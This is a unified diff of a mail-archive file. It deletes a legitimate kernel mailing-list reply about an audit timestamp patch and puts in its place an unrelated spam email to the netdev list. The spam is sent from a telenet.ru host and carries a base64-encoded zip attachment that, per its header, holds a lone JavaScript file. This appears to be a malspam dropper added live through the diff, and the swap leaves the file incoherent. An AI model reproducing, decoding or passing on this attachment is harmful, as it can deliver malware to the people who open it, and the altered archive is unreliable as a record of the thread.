@@ -1,54 +1,66 @@
-From: Paul Moore <paul@paul-moore.com>
-Subject: Re: [PATCH 06/12] audit: Use timespec64 to represent audit
-	timestamps
-Date: Tue, 11 Apr 2017 16:12:02 -0400
-Message-ID: <CAHC9VhTMU7cEJD2rffxOshEnL18i597GBsvHZm-Y8hCE9SJCAA@mail.gmail.com>
-References: <1491613030-11599-1-git-send-email-deepa.kernel@gmail.com>
- <1491613030-11599-7-git-send-email-deepa.kernel@gmail.com>
- <CAHC9VhTYWeKL+BAb6F3tfwzs7OKUEA8ANM=V05sfoiahNNX=9w@mail.gmail.com>
- <CABeXuvoKmvbo_n3XQ0Y+iWGz88Jr3TwbPA7GiR3pia9407ANLw@mail.gmail.com>
+From: <kelley@colfaxcommunitynetwork.org>
+Subject: 55 netdev
+Date: Tue, 11 Apr 2017 20:23:07 -0000
+Message-ID: <149194218710.21476.10488296638211012101@telenet.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
+Content-Type: application/zip; name="6422.zip"
 Content-Transfer-Encoding: base64
-Cc: yuchao0@huawei.com, "J. Bruce Fields" <bfields@fieldses.org>,
- Chris Mason <clm@fb.com>, linux-mtd <linux-mtd@lists.infradead.org>,
- Evgeniy Dushistov <dushistov@mail.ru>, Jeff Layton <jlayton@poochiereds.net>,
- ceph-devel <ceph-devel@vger.kernel.org>, devel@driverdev.osuosl.org,
- linux-cifs@vger.kernel.org, y2038 Mailman List <y2038@lists.linaro.org>,
- Ingo Molnar <mingo@redhat.com>, James Simmons <jsimmons@infradead.org>,
- Arnd Bergmann <arnd@arndb.de>, Steven Rostedt <rostedt@goodmis.org>,
- oleg.drokin@intel.com, John Stultz <john.stultz@linaro.org>,
- Alexander Viro <viro@zeniv.linux.org.uk>, David Sterba <dsterba@suse.com>,
- Jaegeuk Kim <jaegeuk@kernel.org>, Thomas Gleixner <tglx@linutronix.de>,
- andreas.dilger@intel.com, Josef Bacik <jbacik@fb.com>,
- Greg KH <gregkh@linuxfoundation.org>, samba-technical@lists.samba.org,
- Linux Kernel Mailing List <linux-kernel@vger.kernel.org>,
-To: Deepa Dinamani <deepa.kernel@gmail.com>
-Return-path: <y2038-bounces@lists.linaro.org>
-In-Reply-To: <CABeXuvoKmvbo_n3XQ0Y+iWGz88Jr3TwbPA7GiR3pia9407ANLw@mail.gmail.com>
-List-Unsubscribe: <https://lists.linaro.org/mailman/options/y2038>,
- <mailto:y2038-request@lists.linaro.org?subject=unsubscribe>
-List-Archive: <http://lists.linaro.org/pipermail/y2038/>
-List-Post: <mailto:y2038@lists.linaro.org>
-List-Help: <mailto:y2038-request@lists.linaro.org?subject=help>
-List-Subscribe: <https://lists.linaro.org/mailman/listinfo/y2038>,
- <mailto:y2038-request@lists.linaro.org?subject=subscribe>
-Errors-To: y2038-bounces@lists.linaro.org
-Sender: "Y2038" <y2038-bounces@lists.linaro.org>
-List-Id: netdev.vger.kernel.org
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from 210.186-73-188.telenet.ru ([188.73.186.210]:48910 "HELO
+        telenet.ru" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753273AbdDKUXL (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Tue, 11 Apr 2017 16:23:11 -0400
+Content-Disposition: attachment
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-T24gU2F0LCBBcHIgOCwgMjAxNyBhdCAxOjU4IFBNLCBEZWVwYSBEaW5hbWFuaSA8ZGVlcGEua2Vy
-bmVsQGdtYWlsLmNvbT4gd3JvdGU6Cj4+IEkgaGF2ZSBubyBwcm9ibGVtIG1lcmdpbmcgdGhpcyBw
-YXRjaCBpbnRvIGF1ZGl0L25leHQgZm9yIHY0LjEyLCB3b3VsZAo+PiB5b3UgcHJlZmVyIG1lIHRv
-IGRvIHRoYXQgc28gYXQgbGVhc3QgdGhpcyBwYXRjaCBpcyBtZXJnZWQ/Cj4KPiBUaGlzIHdvdWxk
-IGJlIGZpbmUuCj4gQnV0LCBJIHRoaW5rIHdob2V2ZXIgdGFrZXMgdGhlIGxhc3QgMiBkZWxldGlv
-biBwYXRjaGVzIHNob3VsZCBhbHNvIHRha2UgdGhlbS4KPiBJJ20gbm90IHN1cmUgaG93IHRoYXQg
-cGFydCB3b3JrcyBvdXQuCgpGV0lXLCBJIGp1c3QgbWVyZ2VkIHRoaXMgaW50byB0aGUgYXVkaXQv
-bmV4dCBicmFuY2ggc28gYXQgbGVhc3QgdGhpcwp3aWxsIGdvIGludG8gdjQuMTIuCgo+PiBJdCB3
-b3VsZCBwcm9iYWJseSBtYWtlIGxpZmUgYSBzbWFsbCBiaXQgZWFzaWVyIGZvciB1cyBpbiB0aGUg
-YXVkaXQKPj4gd29ybGQgdG9vIGFzIGl0IHdvdWxkIHJlZHVjZSB0aGUgcG90ZW50aWFsIG1lcmdl
-IGNvbmZsaWN0LiAgSG93ZXZlciwKPj4gdGhhdCdzIGEgcmVsYXRpdmVseSBzbWFsbCB0aGluZyB0
-byB3b3JyeSBhYm91dC4KCi0tIApwYXVsIG1vb3JlCnd3dy5wYXVsLW1vb3JlLmNvbQpfX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwpZMjAzOCBtYWlsaW5nIGxp
-c3QKWTIwMzhAbGlzdHMubGluYXJvLm9yZwpodHRwczovL2xpc3RzLmxpbmFyby5vcmcvbWFpbG1h
-bi9saXN0aW5mby95MjAzOAo=
+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
+UgoAAAAA
